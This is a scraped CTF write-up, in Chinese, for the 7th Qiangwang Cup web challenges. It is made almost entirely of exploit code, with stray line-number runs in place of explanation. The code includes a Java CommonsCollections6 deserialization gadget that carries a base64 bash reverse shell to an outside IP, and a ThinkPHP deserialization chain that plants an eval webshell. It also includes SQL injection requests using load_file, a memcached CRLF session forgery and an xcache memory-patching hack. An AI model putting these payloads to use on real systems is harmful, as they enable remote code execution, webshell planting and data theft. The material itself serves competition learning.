# 第七届 强网杯 全国网络安全挑战赛 Web Writeup

> 原文: https://www.ctfiot.com/151907.html
> ID: 151907


```
1
2
3
4
5
6
7
8
c6d4c9861179fe161d0233e3570998dc
_GET
strlen
wrong answer
str_split
implode
cat /flag
system
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
    #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
    #include <sys/mman.h>
void mymmap(){
int file1 = open("/tmp/clean_b3", O_RDONLY);
 size_t ro_addr = 0x7fb5ed09c000;
 size_t rw_addr = 0x7fb5ed09c000 + 0x4000000;
 size_t ro_size=0x4000000;
 int mmap1_result = mmap(ro_addr, ro_size, PROT_READ, MAP_PRIVATE| MAP_FIXED, file1, 0);
 printf("mmap1_result: %d\n", mmap1_result);
 int mmap2_result = mmap(rw_addr, ro_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED, file1, 0);
 printf("mmap2_result: %d\n", mmap2_result);
}
int is_replaced_1=0;
在这个函数里面加 xc_php_find_unlocked：
if(is_replaced_1 == 0){
 is_replaced_1 = 1;
 TRACE("1: xc_php_find_unlocked force return fake value %s","");
 TRACE("1: size:%d",php->size);
 mymmap();
 char* ptr = 0x7fb5f10bc1e8;
 return ptr;
}else{
 TRACE("1: xc_php_find_unlocked have already faked, do not fake again %s","");
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
#找mmap基址
from pwn import *
filename = "clean_b3"
with open(filename,"rb") as f:
 f.seek(0x20230)
 ptr = u64(f.read(8))
 # sanity check
 f.seek(0x20290)
 ptr2 = u64(f.read(8))
 assert ptr2 > 0x7f0000000000 and ptr2 < 0x7fffffffffff

delta = 0x20290
root = ptr - delta
print("ptr: " + hex(ptr))
print("delta: " + hex(delta))
print("ro_root: " + hex(root))
assert hex(root).endswith("000")
# 远程开启了 xcache read only protection,因此同一个文件被mmap了两次，一个只读的和一个读写的。
real_rw_root = root + 0x4000000
print("rw_root: " + hex(real_rw_root))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
#用函数指针后3位地址找libphp的基址，然后把mmap文件里面远程的函数指针全部替换成本地的函数指针
import re
from pwn import *

remote_file = open("./clean_b3","rb")
remote_data = remote_file.read()
local_file = open("./result3","rb")
local_data = local_file.read()

remote_regex = br'.{3}\xff\xb5\x7f\x00\x00'
local_regex = br'.{3}\xf6\xff\x7f\x00\x00'
findall= re.findall(remote_regex,remote_data)
findall = list(map(u64,findall))
findall_pretty = list(set(list(map(hex,findall))))
print(findall_pretty)

findall_local = re.findall(local_regex,local_data)
findall_local = list(map(u64,findall_local))
findall_local_pretty = list(set(list(map(hex,findall_local))))
print(findall_local_pretty)

for entry in findall_local_pretty:
 for remote_entry in findall_pretty:
 # if the last 3 bytes are the same
 if entry[-3:] == remote_entry[-3:]:
 print("match: ",entry,remote_entry)

'''
match: 0x7ffff6d7ebe0 0x7fb5ff0ebbe0
match: 0x7ffff66d93c0 0x7fb5ff0eb3c0
match: 0x7ffff6def080 0x7fb5ff15c080
match: 0x7ffff6df1cf0 0x7fb5ff15ecf0
'''
local_entry = 0x7ffff6d7ebe0
remote_entry = 0x7fb5ff0ebbe0
# local have aslr disabled.
local_base = 0x7ffff6af4000
local_delta = local_entry - local_base
print("local delta: ",hex(local_delta))

remote_base = remote_entry - local_delta
print("remote base: ",hex(remote_base))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
import subprocess
from pwn import *

data = open("clean_b3","rb").read()

remote_libphp_base = 0x7fb5fee61000 # changeme
local_libphp_base = 0x7ffff76f6000 # changeme 或者如果你关闭了aslr，理论上会得到和这个一样的本地地址

remote_regex = br'.{3}\xff\xb5\x7f\x00\x00' # changeme
import re

def repl(m):
 contents = m.group(0)
 remote_ptr = u64(contents)
 local_ptr = remote_ptr - remote_libphp_base + local_libphp_base
 print(f"replace {hex(remote_ptr)} with {hex(local_ptr)}")
 return p64(local_ptr)

data = re.sub(remote_regex, repl, data)

with open("/tmp/clean_b3_mod","bw") as f:
 f.write(data)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
FROM ubuntu:22.04

ENV TZ=Asia/Shanghai \
 DEBIAN_FRONTEND=noninteractive
RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list && sed -i "s/http:\/\/security.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list && \
apt update && apt install -y software-properties-common && add-apt-repository ppa:
ondrej/php -y && apt install -y php5.6 php5.6-cli
RUN apt install -y php5.6-dev
ADD ./xdebug-2.5.5 /tmp/xdebug
RUN cd /tmp/xdebug \
 && phpize \
 && ./configure --enable-xdebug \
 && make -j$(nproc) \
 && make install \
 && cd /
ADD ./xcache /tmp/xcache
RUN cd /tmp/xcache \
 && phpize \
 && ./configure --enable-xcache --enable-xcache-disassembler \
 && make -j$(nproc) \
 && make install \
 && cd /
COPY xcache.ini /tmp/
COPY challenge.php /var/www/html/
COPY info.php /var/www/html/
RUN cat /tmp/xcache.ini >> /etc/php/5.6/apache2/php.ini && touch /var/www/html/b3debcdfb73572a549ac64da1c830d72 && chmod 777 /var/www/html/b3debcdfb73572a549ac64da1c830d72
# RUN echo 'extension = xcache.so' > /etc/php/5.6/mods-available/xcache.ini
RUN echo 'extension = xcache.so' > /etc/php/5.6/apache2/conf.d/20-xcache.ini
RUN echo 'zend_extension=/usr/lib/php/20131226/xdebug.so' > /etc/php/5.6/apache2/conf.d/99-xdebug.ini
RUN echo '[Xdebug]' >> /etc/php/5.6/apache2/conf.d/99-xdebug.ini
RUN echo 'xdebug.auto_trace=On' >> /etc/php/5.6/apache2/conf.d/99-xdebug.ini
RUN echo 'xdebug.collect_params=1' >> /etc/php/5.6/apache2/conf.d/99-xdebug.ini
RUN echo 'xdebug.collect_return=1' >> /etc/php/5.6/apache2/conf.d/99-xdebug.ini
RUN echo 'xdebug.collect_assignments=1' >> /etc/php/5.6/apache2/conf.d/99-xdebug.ini
RUN echo 'xdebug.collect_vars=1' >> /etc/php/5.6/apache2/conf.d/99-xdebug.ini
RUN ln -sf /proc/self/fd/1 /var/log/apache2/access.log && \
 ln -sf /proc/self/fd/1 /var/log/apache2/error.log
CMD apachectl -D FOREGROUND -X
1
2
3
4
5
6
7
8
9
10
11
12
13
TRACE START [2023-12-16 17:53:20]
 0.0000 232096 -> {main}() /var/www/html/challenge.php:0
 0.0001 232440 -> strlen(string(32)) /var/www/html/challenge.php:5
 0.0001 232440 >=> 32
 0.0001 232440 -> str_split(string(32)) /var/www/html/challenge.php:9
 0.0001 238176 >=> array (0 => 'O', 1 => '\032', 2 => 'H', 3 => '\030', 4 => 'O', 5 => '\025', 6 => '\024', 7 => '\032', 8 => '\035', 9 => '\035', 10 => '\033', 11 => '\025', 12 => 'J', 13 => 'I', 14 => '�', 15 => '�', 16 => '�', 17 => '�', 18 => '�', 19 => '�', 20 => '�', 21 => '�', 22 => '�', 23 => '�', 24 => '�', 25 => '�', 26 => '�', 27 => '�', 28 => '�', 29 => '�', 30 => '�', 31 => '�')
 0.0001 238472 -> implode(array(32)) /var/www/html/challenge.php:16
 0.0001 241792 >=> 'c6d4c9861179fe161d0233e3570998dc'
 0.0001 238552 -> system(string(9)) /var/www/html/challenge.php:17
 0.0014 238664 >=> 'flag'
 0.0014 238552 >=> 1
 0.0015 8368
TRACE END [2023-12-16 17:53:20]
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
import requests

rs = requests.Session()

data = b'a'*32
r = rs.get('http://127.0.0.1/challenge.php', params={'key': data})

import subprocess
output = subprocess.check_output("docker exec -it dump bash -c 'cat /tmp/trace*'",shell=True)
import re

regex = re.compile(rb" >=> '(.{32})'")
matched = regex.findall(output)
key_ = matched[0]

key = b''
for i in range(len(key_)):
 key += bytes([key_[i] ^ ord('a')])
print(key)

cipher = b'936998e2dbec20ad5a37dc8f06f7d672'
xored_cipher = b''
for i in range(len(cipher)):
 xored_cipher += bytes([cipher[i] ^ key[i]])
print(xored_cipher)

r2 = rs.get('http://eci-2ze245ak3rvctqp48pe0.cloudeci1.ichunqiu.com/challenge.php', params={'key': xored_cipher})
print(r2.text)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Hashmap(hashcode)->TiedmapEntry(hashcode)->TiedMapEntry(getvalue)->Lazymap(get)->transform
 */
public class CommonsCollections6 {
 public static void main(String[] args) throws Exception {
 Transformer[] transformers=new Transformer[]{
 new ConstantTransformer(Runtime.class),
 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
 new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NSA8JjEi}|{base64,-d}|{bash,-i}"})
 };
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
 HashMap<Object,Object> map=new HashMap<>();
 Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1)); //随便改成什么Transformer
 TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap, "aaa");
 HashMap<Object, Object> hashMap=new HashMap<>();
 hashMap.put(tiedMapEntry,"bbb");
 map.remove("aaa");
 Field factory = LazyMap.class.getDeclaredField("factory");
 factory.setAccessible(true);
 factory.set(lazymap,chainedTransformer);
 String poc = SerializeUtils.base64serial(hashMap);
 System.out.println(poc);
 SerializeUtils.base64deserial(poc);
 }
}
1
echo "{'serializeData': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQAaWJhc2ggLWMge2VjaG8sWW1GemFDQXRZeUFpWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4NExqRXpNQzR5TkM0eE9EZ3ZOemMzTlNBOEpqRWl9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABwAAAABcQB+AB9zcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAA2JiYng='}" | grpc_cli call 8.147.133.227:
32866 ProcessMsg --json_input
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
POST /public/index.php/index/admin/do_edit.html HTTP/1.1
Host: eci-2zegp2dwag3hcmblf44t.cloudeci1.ichunqiu.com
Content-Length: 2500
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2zegp2dwag3hcmblf44t.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zegp2dwag3hcmblf44t.cloudeci1.ichunqiu.com/public/index.php/index/admin/goods_edit/id/1.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1700560980,1701446760,1702540036,1702548089; PHPSESSID=vv0dcps9gjic3qhnooqk9v36j2
Connection: close

id=1&name=fake_flag&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&data`%3d%27YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YTo3OntpOjA7czo3OiJnZXRBdHRyIjtpOjE7czo0OiJpbmZvIjtpOjI7czo1OiJlcnJvciI7aTozO3M6NzoiY29tbWVudCI7aTo0O3M6ODoicXVlc3Rpb24iO2k6NTtzOjk6ImhpZ2hsaWdodCI7aTo2O3M6Nzoid2FybmluZyI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NDp7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6NzU6InBocDovL2ZpbHRlci93cml0ZT1zdHJpbmcucm90MTMvcmVzb3VyY2U9c3RhdGljLzw%2FY3VjIEByaW55KCRfVFJHWyduJ10pOyA%2FPiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czo0OiJ4aWdlIjt9fX1zOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InRlc3QiO3M6ODoiZ2V0RXJyb3IiO31zOjc6IgAqAGRhdGEiO2E6MTp7czo3OiJwYW5yZW50IjtzOjQ6InRydWUiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjU6e3M6NToibW9kZWwiO2I6MDtzOjE1OiIAKgBzZWxmUmVsYXRpb24iO2I6MDtzOjk6IgAqAHBhcmVudCI7TjtzOjg6IgAqAHF1ZXJ5IjtPOjE0OiJ0aGlua1xkYlxRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjc6e2k6MDtzOjc6ImdldEF0dHIiO2k6MTtzOjQ6ImluZm8iO2k6MjtzOjU6ImVycm9yIjtpOjM7czo3OiJjb21tZW50IjtpOjQ7czo4OiJxdWVzdGlvbiI7aTo1O3M6OToiaGlnaGxpZ2h0IjtpOjY7czo3OiJ3YXJuaW5nIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo0OntzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czo3NToicGhwOi8vZmlsdGVyL3dyaXRlPXN0cmluZy5yb3QxMy9yZXNvdXJjZT1zdGF0aWMvPD9jdWMgQHJpbnkoJF9UUkdbJ24nXSk7ID8%2BIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtzOjQ6InhpZ2UiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntzOjI6Inh4IjtzOjI6Inh4Ijt9fXM6ODoiACoAbW9kZWwiO3M6NDoidGVzdCI7fX19fQ%3D%3D%27%09where%09`id`%3d1%23a=1&data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
<?php
namespace think\cache\driver;

class File {
 protected $options = [];
 protected $tag;
 public function __construct() {
 $this->tag = 'xige';
 $this->options = [
 'cache_subdir' => false,
 'prefix' => '',
 'path' => 'php://filter/write=string.rot13/resource=static/<?cuc @riny($_TRG[\'n\']); ?>', // 因为 static 目录有写权限
 'data_compress' => false
 ];
 }
}

namespace think\session\driver;
use think\cache\driver\File;

class Memcached {
 protected $handler;
 function __construct() {
 $this->handler=new File();
 }
}

namespace think\console;
use think\session\driver\Memcached;

class Output {
 protected $styles = [];
 private $handle;
 function __construct() {
 $this->styles = ["getAttr", 'info',
 'error',
 'comment',
 'question',
 'highlight',
 'warning'];
 $this->handle = new Memcached();
 }
}

namespace think\db;
use think\console\Output;

class Query {
 protected $model;
 function __construct() {
 $this->model = new Output();
 }
}

namespace think\model\relation;
use think\console\Output;
use think\db\Query;

class HasOne {
 public $model;
 protected $selfRelation;
 protected $parent;
 protected $query;
 protected $bindAttr = [];
 public function __construct() {
 $this->query = new Query("xx", 'think\console\Output');
 $this->model = false;
 $this->selfRelation = false;
 $this->bindAttr = ["xx" => "xx"];
 }}

namespace think\model;
use think\console\Output;
use think\model\relation\HasOne;

abstract class Model {
}

class Pivot extends Model {
 public $parent;
 protected $append = [];
 protected $data = [];
 protected $error;
 protected $model;

 function __construct() {
 $this->parent = new Output();
 $this->error = new HasOne();
 $this->model = "test";
 $this->append = ["test" => "getError"];
 $this->data = ["panrent" => "true"];
 }
}

namespace think\process\pipes;
use think\model\Pivot;

class Windows {
 private $files = [];
 public function __construct() {
 $this->files=[new Pivot()];
 }
}

$obj = new Windows();
$payload = serialize([$obj]);
echo base64_encode($payload);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
POST /public/index.php/index/admin/do_edit.html HTTP/1.1
Host: eci-2ze0mwyalswv7z0u3m1h.cloudeci1.ichunqiu.com
Content-Length: 488
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2ze0mwyalswv7z0u3m1h.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2ze0mwyalswv7z0u3m1h.cloudeci1.ichunqiu.com/public/index.php/index/admin/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,mg;q=0.7
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1701446760,1702540036,1702548089,1702783234; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1702786165; PHPSESSID=nucuu7f9vk71ojeseih8eropo4
Connection: close

id=1&name=fake_flag&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&data`%3dload_file(%27/fffflllaaaagggg%27)%09where%09`id`%3d1%23a=1&data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A
1
1222%00%0d%0aset think:
shop.admin|1 0 1702802967 101%0d%0aa:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"e10adc3949ba59abbe56e057f20f883e";}%0d%0a
1
2
3
4
5
6
7
8
9
10
11
12
13
14
从memcacheget的$key为think:
shop.admin|1 1是我们传入的用户名
找到https://www.freebuf.com/vuls/328384.html
memcached的问题。crlf。

本地设置一个admin。登录抓set memcached的包

最后构造
username=1222%00%0d%0a%73%65%74%20%74%68%69%6e%6b%3a%73%68%6f%70%2e%61%64%6d%69%6e%7c%31%20%34%20%31%37%30%32%38%30%32%39%36%37%20%31%30%31%0d%0a%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%38%3a%22%75%73%65%72%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%38%3a%22%70%61%73%73%77%6f%72%64%22%3b%73%3a%33%32%3a%22%65%31%30%61%64%63%33%39%34%39%62%61%35%39%61%62%62%65%35%36%65%30%35%37%66%32%30%66%38%38%33%65%22%3b%7d%0d%0aquit&password=1

然后username=1&password=123456登录

登录之后。后台sql注入load_file

id=4&name=fake_flag&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&data`%3dload_file(%27/fffflllaaaagggg%27)%09where%09id%3d4%23&data=%23
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800f8bd4e01.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800f99ea6fa.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fa4ce89a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fb06eb2e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fb4e3a06.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fb90633e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fbde3830.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fc589501.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fd29b800.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/img_65800fde2c3f1.png)